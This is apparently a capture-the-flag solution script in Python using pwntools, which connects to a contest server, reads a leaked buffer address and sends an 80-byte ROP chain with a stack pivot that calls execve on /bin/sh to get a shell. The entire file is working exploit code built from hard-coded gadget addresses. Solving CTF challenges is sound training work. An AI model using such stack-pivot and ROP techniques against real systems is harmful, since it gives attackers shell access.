#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./chal")
#p = process(elf.path)
p = remote('nc.asrctf.online', 21306)
# get input buffer leak
p.recvuntil(b"67 this 67 that how bout I give you 67 space on the ")
input_buf_leak = int(p.recvline().decode().strip(), 16)

# use binsh location provided in win function
binsh_location = p64(0x477043)
syscall = p64(0x00000000004011da)
pop_rsi = p64(0x000000000040ba5d)
pop_rdi = p64(0x0000000000402101)
pop_rax_rdx_rbx = p64(0x000000000045dd36)
leave_ret = p64(0x000000000040182a)

# We have to fit our payload in less than 80 bytes. 
# This is my ropchain with exact length of 80 bytes
# A ropchain of shorter length that works is welcomed (pm me on discord: neko4394)
ropchain = b"\x00"*8 + pop_rax_rdx_rbx + p64(0x3b) + p64(0) + p64(0)
ropchain += pop_rdi
ropchain += binsh_location
ropchain += pop_rsi
ropchain += p64(0)
ropchain += syscall


print(len(ropchain))
payload = ropchain.ljust(80, b"A")
payload += p64(input_buf_leak)
# return back to the start of our buffer to execute ropchain
payload += leave_ret

p.sendline(payload)
p.interactive()
